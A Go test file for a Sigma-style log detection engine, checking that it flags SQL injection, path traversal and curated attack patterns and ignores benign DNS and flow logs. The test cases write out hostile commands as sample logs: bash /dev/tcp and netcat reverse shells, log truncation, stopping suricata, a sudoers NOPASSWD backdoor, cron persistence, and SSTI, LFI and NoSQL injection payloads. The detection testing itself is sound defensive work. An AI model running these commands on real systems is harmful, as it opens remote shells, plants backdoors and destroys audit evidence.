package main

import (
	"testing"
)

func TestSigmaEngineYAMLCompilationAndEvaluation(t *testing.T) {
	engine := NewSigmaEngine("") // Load built-ins

	// Test 1: Web SQL Injection rule
	sqliLog := `198.51.100.5 - - [24/Aug/2026:12:00:00 +0000] "GET /search?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1" 200`
	fields := map[string]string{
		"source":    "nginx",
		"client_ip": "198.51.100.5",
		"status":    "200",
		"raw":       sqliLog,
	}

	rule, matched := engine.EvaluateEvent(sqliLog, fields)
	if !matched || rule == nil {
		t.Fatalf("Expected Sigma engine to detect SQLi attack, but got matched=%v", matched)
	}

	if rule.MitreTechniqueID != "T1190" {
		t.Errorf("Expected MITRE T1190, got: %s", rule.MitreTechniqueID)
	}

	if rule.ThreatScore < 90 {
		t.Errorf("Expected critical threat score (>=90), got: %d", rule.ThreatScore)
	}

	// Test 2: Custom Sigma YAML with complex condition (selection and not filter)
	customYAML := `
title: Suspicious Web Path Traversal Probe
id: test-path-traversal
status: experimental
description: Detects directory traversal sequence
tags:
  - attack.initial_access
  - attack.t1083
level: high
logsource:
  category: webserver
detection:
  selection:
    _raw|contains: "../"
  filter_known_safe:
    _raw|contains: "safe_static_dir"
  condition: selection and not filter_known_safe
`
	compiledRule, err := engine.ParseSigmaYAML(customYAML)
	if err != nil {
		t.Fatalf("ParseSigmaYAML failed: %v", err)
	}

	engine.AddRule(compiledRule)

	// Sub-test 2a: Malicious path traversal
	maliciousTraverse := `GET /downloads?file=../../../../etc/passwd HTTP/1.1`
	rule, matched = engine.EvaluateEvent(maliciousTraverse, map[string]string{"raw": maliciousTraverse})
	if !matched || rule.ID != "test-path-traversal" {
		t.Errorf("Expected path traversal rule to match, got matched=%v, rule=%+v", matched, rule)
	}

	// Sub-test 2b: Filtered safe directory should NOT match
	safeTraverse := `GET /static/safe_static_dir/../img.png HTTP/1.1`
	rule, matched = engine.EvaluateEvent(safeTraverse, map[string]string{"raw": safeTraverse})
	if matched && rule.ID == "test-path-traversal" {
		t.Errorf("Expected filtered safe log to be excluded by 'and not filter_known_safe'")
	}
}

func TestSigmaModifiers(t *testing.T) {
	engine := NewSigmaEngine("")

	// Test CIDR modifier and Base64 modifier
	cidrYAML := `
title: Suspicious Subnet Access
id: test-cidr-match
level: medium
tags:
  - attack.t1071
detection:
  selection_ip:
    client_ip|cidr: "198.51.100.0/24"
  condition: selection_ip
`
	rule, err := engine.ParseSigmaYAML(cidrYAML)
	if err != nil {
		t.Fatalf("ParseSigmaYAML failed: %v", err)
	}
	engine.AddRule(rule)

	inSubnet := map[string]string{"client_ip": "198.51.100.42"}
	matchedRule, matched := engine.EvaluateEvent("dummy log", inSubnet)
	if !matched || matchedRule.ID != "test-cidr-match" {
		t.Errorf("Expected CIDR match for 198.51.100.42 within 198.51.100.0/24")
	}

	outSubnet := map[string]string{"client_ip": "203.0.113.10"}
	_, matched2 := engine.EvaluateEvent("dummy log", outSubnet)
	if matched2 {
		t.Errorf("Expected no CIDR match for 203.0.113.10")
	}
}

func TestCuratedSigmaRulePackDetections(t *testing.T) {
	engine := NewSigmaEngine("") // Auto-loads curated rule pack

	cases := []struct {
		name       string
		log        string
		fields     map[string]string
		expectedID string
		mitreID    string
	}{
		// 1. Linux Reverse Shells
		{
			name:       "Bash /dev/tcp Reverse Shell",
			log:        "bash -i >& /dev/tcp/198.51.100.22/4444 0>&1",
			fields:     map[string]string{"CommandLine": "bash -i >& /dev/tcp/198.51.100.22/4444 0>&1"},
			expectedID: "sigma-linux-revshell",
			mitreID:    "T1059.004",
		},
		{
			name:       "Netcat Shell Spawn",
			log:        "nc -e /bin/sh 198.51.100.55 1337",
			fields:     map[string]string{"CommandLine": "nc -e /bin/sh 198.51.100.55 1337"},
			expectedID: "sigma-linux-revshell",
			mitreID:    "T1059.004",
		},
		{
			name:       "Python PTY Spawn One-Liner",
			log:        `python3 -c "import pty; pty.spawn('/bin/bash')"`,
			fields:     map[string]string{"CommandLine": `python3 -c "import pty; pty.spawn('/bin/bash')"`},
			expectedID: "sigma-linux-revshell",
			mitreID:    "T1059.004",
		},

		// 2. Defense Evasion & Anti-Forensics
		{
			name:       "History Clear & Unset HISTFILE",
			log:        "unset HISTFILE && history -c",
			fields:     map[string]string{"CommandLine": "unset HISTFILE && history -c"},
			expectedID: "sigma-linux-evasion",
			mitreID:    "T1070",
		},
		{
			name:       "Log File Truncation",
			log:        "truncate -s 0 /var/log/auth.log",
			fields:     map[string]string{"CommandLine": "truncate -s 0 /var/log/auth.log"},
			expectedID: "sigma-linux-evasion",
			mitreID:    "T1070",
		},
		{
			name:       "Security Daemon Termination",
			log:        "systemctl stop suricata",
			fields:     map[string]string{"CommandLine": "systemctl stop suricata"},
			expectedID: "sigma-linux-evasion",
			mitreID:    "T1070",
		},

		// 3. Persistence & Privilege Escalation
		{
			name:       "Sudoers NOPASSWD Modification",
			log:        "echo 'attacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
			fields:     map[string]string{"CommandLine": "echo 'attacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"},
			expectedID: "sigma-linux-persistence",
			mitreID:    "T1053",
		},
		{
			name:       "Cronjob Persistence Directory Access",
			log:        "cp /tmp/backdoor /etc/cron.hourly/backup_sync",
			fields:     map[string]string{"CommandLine": "cp /tmp/backdoor /etc/cron.hourly/backup_sync"},
			expectedID: "sigma-linux-persistence",
			mitreID:    "T1053",
		},
		{
			name:       "SUID Bit Set on Binary",
			log:        "chmod u+s /usr/bin/python3",
			fields:     map[string]string{"CommandLine": "chmod u+s /usr/bin/python3"},
			expectedID: "sigma-linux-persistence",
			mitreID:    "T1053",
		},

		// 4. Advanced Web Exploits & Modern Injection
		{
			name:       "Server-Side Template Injection (SSTI)",
			log:        `GET /profile?name={{7*7}} HTTP/1.1`,
			fields:     map[string]string{"RequestURI": "/profile?name={{7*7}}"},
			expectedID: "sigma-web-advanced",
			mitreID:    "T1190",
		},
		{
			name:       "PHP Filter Wrapper LFI",
			log:        `GET /index.php?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1`,
			fields:     map[string]string{"RequestURI": "/index.php?page=php://filter/convert.base64-encode/resource=config.php"},
			expectedID: "sigma-web-advanced",
			mitreID:    "T1190",
		},
		{
			name:       "Out-of-Band OAST Exfiltration Probe",
			log:        `GET /search?q=test.oastify.com HTTP/1.1`,
			fields:     map[string]string{"RequestURI": "/search?q=test.oastify.com"},
			expectedID: "sigma-web-advanced",
			mitreID:    "T1190",
		},
		{
			name:       "NoSQL Injection Operator",
			log:        `POST /login HTTP/1.1 {"username": {"$gt": ""}, "password": {"$gt": ""}}`,
			fields:     map[string]string{"RawLog": `POST /login HTTP/1.1 {"username": {"$gt": ""}, "password": {"$gt": ""}}`},
			expectedID: "sigma-web-advanced",
			mitreID:    "T1190",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rule, matched := engine.EvaluateEvent(tc.log, tc.fields)
			if !matched || rule == nil {
				t.Fatalf("Failed to detect %s (log: %s)", tc.name, tc.log)
			}
			if rule.ID != tc.expectedID {
				t.Errorf("Expected rule ID %s, got %s", tc.expectedID, rule.ID)
			}
		})
	}
}

func TestSigmaBenignDNSAndFlowSuppression(t *testing.T) {
	engine := NewSigmaEngine("")

	// 1. Standard DNS query to 8.8.8.8:53
	dnsQuery := `{"timestamp":"2026-08-25T12:00:00Z","event_type":"dns","src_ip":"192.168.1.100","dest_ip":"8.8.8.8","dest_port":53,"proto":"UDP","dns":{"type":"query","rrname":"google.com"}}`
	rule, matched := engine.EvaluateEvent(dnsQuery, map[string]string{
		"source":    "suricata",
		"client_ip": "8.8.8.8",
		"raw":       dnsQuery,
	})
	if matched || rule != nil {
		t.Errorf("Expected benign DNS query to be suppressed from Sigma matching, but matched: %+v", rule)
	}

	// 2. Generic Suricata network flow
	flowLog := `{"timestamp":"2026-08-25T12:00:00Z","event_type":"flow","src_ip":"192.168.1.100","dest_ip":"1.1.1.1","dest_port":443,"proto":"TCP"}`
	rule, matched = engine.EvaluateEvent(flowLog, map[string]string{
		"source":    "suricata",
		"client_ip": "1.1.1.1",
		"raw":       flowLog,
	})
	if matched || rule != nil {
		t.Errorf("Expected generic Suricata flow to be suppressed from Sigma matching, but matched: %+v", rule)
	}
}
